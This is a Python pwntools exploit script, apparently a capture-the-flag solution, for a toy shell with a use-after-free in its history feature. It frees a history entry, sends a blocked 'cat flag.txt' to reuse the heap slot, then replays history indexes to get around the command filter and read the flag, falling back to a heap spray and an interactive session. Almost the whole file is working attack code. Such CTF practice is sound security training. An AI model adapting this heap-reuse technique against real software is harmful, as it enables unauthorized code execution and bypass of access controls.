#!/usr/bin/env python3
from pwn import *

# Configuration
binary_path = './ksh'  
host = 'localhost'     # Update for remote
port = 1337            # Update for remote

# Set context
context.log_level = 'error'
context.arch = 'amd64'

def exploit(r):
    """
    Use-After-Free exploit for xsh shell
    
    Strategy:
    1. Add benign command to history
    2. Delete it (UAF - pointer freed but not NULLed)
    3. Add blocked command (reads input even if blocked)
    4. Execute from history - might execute freed/reallocated memory
    """
    
    # Wait for prompt
    r.recvuntil(b'$ ')
    
    # Step 1: Add a short benign command to history
    log.info("Step 1: Adding benign command to history")
    r.sendline(b'help')
    r.recvuntil(b'$ ')
    
    # Step 2: Verify it's in history
    log.info("Step 2: Checking history")
    r.sendline(b'history')
    r.recvuntil(b'$ ')
    
    # Step 3: Delete the command (UAF trigger)
    log.info("Step 3: Deleting command (UAF trigger)")
    r.sendline(b'delete 0')
    r.recvuntil(b'$ ')
    
    # Step 4: Add the blocked command - this allocates memory
    # Even though check_command() blocks it, read_input() still malloc's the string
    log.info("Step 4: Sending blocked command (hoping for heap reuse)")
    r.sendline(b'cat flag.txt')
    r.recvuntil(b'$ ')
    
    # Step 5: Execute from freed memory
    log.info("Step 5: Executing !0 (use-after-free)")
    r.sendline(b'!0')
    
    # Try to receive flag
    try:
        response = r.recvuntil(b'$ ', timeout=2)
        log.success(f"Response: {response}")
        
        # Look for flag pattern
        if b'{' in response or b'flag' in response.lower():
            log.success("Potential flag found!")
            print(response.decode(errors='ignore'))
    except:
        pass
    
    # Alternative: Try more heap manipulation
    log.info("Alternative: Trying heap spray technique")
    
    # Add more commands to manipulate heap
    for i in range(5):
        r.sendline(b'help')
        r.recvuntil(b'$ ')
    
    r.sendline(b'history')
    r.recvuntil(b'$ ')
    
    # Delete first one again
    r.sendline(b'delete 0')
    r.recvuntil(b'$ ')
    
    # Send flag command multiple times to increase chances of reuse
    for _ in range(3):
        r.sendline(b'cat flag.txt')
        try:
            r.recvuntil(b'$ ', timeout=1)
        except:
            pass
    
    # Try executing different indices
    for i in range(5):
        log.info(f"Trying !{i}")
        r.sendline(f'!{i}'.encode())
        try:
            response = r.recvuntil(b'$ ', timeout=1)
            if b'{' in response or b'AZ' in response:
                log.success(f"FLAG FOUND at index {i}!")
                print(response.decode(errors='ignore'))
                return response
        except:
            pass
    
    # Interactive mode to debug
    r.interactive()

def main():
    # Choose between local and remote
    if args.REMOTE:
        r = remote(host, port)
    else:
        # Local binary
        r = process(binary_path)
    
    try:
        exploit(r)
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        r.interactive()

if __name__ == '__main__':
    main()
